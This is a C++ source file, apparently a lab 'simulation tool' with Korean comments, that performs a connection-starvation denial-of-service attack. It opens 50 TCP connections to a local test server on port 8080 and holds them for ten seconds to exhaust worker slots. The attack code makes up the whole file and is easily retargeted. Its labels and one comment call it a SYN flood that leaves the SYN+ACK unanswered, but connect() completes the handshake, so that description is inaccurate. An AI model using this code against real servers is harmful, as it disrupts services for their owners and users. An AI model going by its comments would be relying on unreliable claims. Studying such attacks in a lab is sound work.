#include <chrono>
#include <cstring>
#include <iostream>
#include <thread>
#include <vector>

#ifdef _WIN32
#include <WinSock2.h> // socket handle
#include <ws2tcpip.h> // IP 변환 함수(헤더를 변환해야 하기 때문)
#else
#include <arpa/inet.h> // 엔디안 변환용 (리틀->빅)
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#endif

int main() {
#ifdef _WIN32
    // Windows Socket subsystem 초기화
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed\n";
        return 1;
    }
#endif

    std::cout << "[Ochlos] TCP SYN Flooding Simulation Tool initialized.\n";

    // 공격 대상 서버 정보 설정 (도커 내부에서 돌아가고 있는 컨테이너가 대상)
    const char *target_ip = "127.0.0.1";
    const int target_port = 8080;

    // socket에 대한 구조체를 설정한 후
    struct sockaddr_in target_addr;
    // 메모리 0으로 세팅한 다음
    std::memset(&target_addr, 0, sizeof(target_addr));
    // IPv4 라고 지정해준다 (AF_INET; Address Family InterNET)
    target_addr.sin_family = AF_INET;
    // 그리고 socket의 포트 역시 지정
    // htons; Host TO Network Short (리틀->빅 으로 변환해서 저장)
    target_addr.sin_port = htons(target_port);

    // ip address를 지정해준다. AF_INET을 인자로 넣어줌으로써 IPv4라는 것을 알 수 있다.
    if (inet_pton(AF_INET, target_ip, &target_addr.sin_addr) <= 0) {
        std::cerr << "Invalid target IP address: " << target_ip << "\n";

#ifdef _WIN32
        WSACleanup();
#endif

        return 1;
    }

#ifdef _WIN32
    using SocketHandle = SOCKET;
    const SocketHandle kInvalidSocket = INVALID_SOCKET;
#else
    using SocketHandle = int;
    const SocketHandle kInvalidSocket = -1;
#endif
    const int target_connections = 50;
    std::vector<SocketHandle> sockets;
    sockets.reserve(target_connections);

    std::cout << "[*] Starting connection starvation attack (Target: " << target_connections << " connections)...\n";

    // Multi-connection creation and connect loop
    for (int i = 0; i < target_connections; i++) {
        SocketHandle sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == kInvalidSocket) {
            std::cerr << "[-] Socket creation failed at index " << i << "\n";
            break;
        }

        if (connect(sock, reinterpret_cast<struct sockaddr *>(&target_addr), sizeof(target_addr)) != 0) {
            std::cerr << "[-] Connection failed at index " << i << "\n";
#ifdef _WIN32
            closesocket(sock);
#else
            close(sock);
#endif
            break;
        }

        // SYN 요청 이후에 return된 SYN+ACK 에 대한 응답을 하지 않기 위해서 보관
        sockets.push_back(sock);
    }

    std::cout << "[+] Establishing and holding " << sockets.size() << " active connections.\n";
    std::cout << "[*] Holding connections for 10 seconds to starve server worker slots...\n";

    std::this_thread::sleep_for(std::chrono::seconds(10));

    std::cout << "[*] Releasing all held sockets...\n";
    for (SocketHandle s : sockets) {
#ifdef _WIN32
        closesocket(s);
#else
        close(s);
#endif
    }
#ifdef _WIN32
    WSACleanup();
#endif

    return 0;
}